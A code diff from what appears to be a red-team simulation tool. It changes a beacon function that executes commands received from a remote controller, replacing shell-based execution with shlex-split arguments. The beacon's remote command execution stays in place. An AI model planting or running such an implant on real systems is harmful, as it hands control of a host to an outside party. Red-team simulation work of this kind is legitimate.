@@ -7,6 +7,7 @@ import sys
 import os
 import subprocess
 import shutil
+import shlex
 
 # Add root to path
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
@@ -40,12 +41,13 @@ def beacon():
             cmd = data.get("command")
             if cmd == "exec":
                 args = data.get("args")
-                # Safe Exec - shlex split would be safer but this is Red Team code...
-                # We silence the warning or accept it as "Intentional Vulnerability" for Red Team.
-                # Let's fix it by list conversion if possible, but 'args' might be complex string.
-                # Keeping shell=True for simulation realism but adding comment.
-                output = subprocess.check_output(args, shell=True).decode().strip()
-                status = f"OUTPUT: {output}"
+                # Secure Execution: No Shell Injection
+                try:
+                    safe_args = shlex.split(args)
+                    output = subprocess.check_output(safe_args, shell=False).decode().strip()
+                    status = f"OUTPUT: {output}"
+                except Exception as e:
+                    status = f"EXEC_ERROR: {e}"
             else:
                 status = "SLEEPING"
 
